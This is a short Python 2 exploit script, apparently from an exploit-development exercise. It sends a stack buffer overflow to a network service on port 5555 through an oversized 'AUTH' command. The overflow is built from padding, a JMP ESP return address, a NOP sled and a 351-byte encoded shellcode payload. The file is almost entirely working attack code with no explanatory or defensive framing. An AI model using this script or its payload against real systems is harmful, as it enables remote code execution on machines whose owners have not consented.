#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

payload =(
"\xbf\xc5\x93\x7b\x38\xdb\xdf\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x52\x31\x7a\x12\x03\x7a\x12\x83\x2f\x6f\x99\xcd\x53\x78\xdc"
"\x2e\xab\x79\x81\xa7\x4e\x48\x81\xdc\x1b\xfb\x31\x96\x49\xf0"
"\xba\xfa\x79\x83\xcf\xd2\x8e\x24\x65\x05\xa1\xb5\xd6\x75\xa0"
"\x35\x25\xaa\x02\x07\xe6\xbf\x43\x40\x1b\x4d\x11\x19\x57\xe0"
"\x85\x2e\x2d\x39\x2e\x7c\xa3\x39\xd3\x35\xc2\x68\x42\x4d\x9d"
"\xaa\x65\x82\x95\xe2\x7d\xc7\x90\xbd\xf6\x33\x6e\x3c\xde\x0d"
"\x8f\x93\x1f\xa2\x62\xed\x58\x05\x9d\x98\x90\x75\x20\x9b\x67"
"\x07\xfe\x2e\x73\xaf\x75\x88\x5f\x51\x59\x4f\x14\x5d\x16\x1b"
"\x72\x42\xa9\xc8\x09\x7e\x22\xef\xdd\xf6\x70\xd4\xf9\x53\x22"
"\x75\x58\x3e\x85\x8a\xba\xe1\x7a\x2f\xb1\x0c\x6e\x42\x98\x58"
"\x43\x6f\x22\x99\xcb\xf8\x51\xab\x54\x53\xfd\x87\x1d\x7d\xfa"
"\xe8\x37\x39\x94\x16\xb8\x3a\xbd\xdc\xec\x6a\xd5\xf5\x8c\xe0"
"\x25\xf9\x58\xa6\x75\x55\x33\x07\x25\x15\xe3\xef\x2f\x9a\xdc"
"\x10\x50\x70\x75\xba\xab\x13\x70\x30\xb3\xc2\xec\x44\xb3\x05"
"\x56\xc1\x55\x6f\xb8\x84\xce\x18\x21\x8d\x84\xb9\xae\x1b\xe1"
"\xfa\x25\xa8\x16\xb4\xcd\xc5\x04\x21\x3e\x90\x76\xe4\x41\x0e"
"\x1e\x6a\xd3\xd5\xde\xe5\xc8\x41\x89\xa2\x3f\x98\x5f\x5f\x19"
"\x32\x7d\xa2\xff\x7d\xc5\x79\x3c\x83\xc4\x0c\x78\xa7\xd6\xc8"
"\x81\xe3\x82\x84\xd7\xbd\x7c\x63\x8e\x0f\xd6\x3d\x7d\xc6\xbe"
"\xb8\x4d\xd9\xb8\xc4\x9b\xaf\x24\x74\x72\xf6\x5b\xb9\x12\xfe"
"\x24\xa7\x82\x01\xff\x63\xa2\xe3\xd5\x99\x4b\xba\xbc\x23\x16"
"\x3d\x6b\x67\x2f\xbe\x99\x18\xd4\xde\xe8\x1d\x90\x58\x01\x6c"
"\x89\x0c\x25\xc3\xaa\x04" )

#76DFE871   FFE4             JMP ESP

req1 = "AUTH " + "\x41"*1040 + "\x71\xE8\xDF\x76" + "\x90"*8 + payload + "C"*(1460-1040-4-8-351)
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
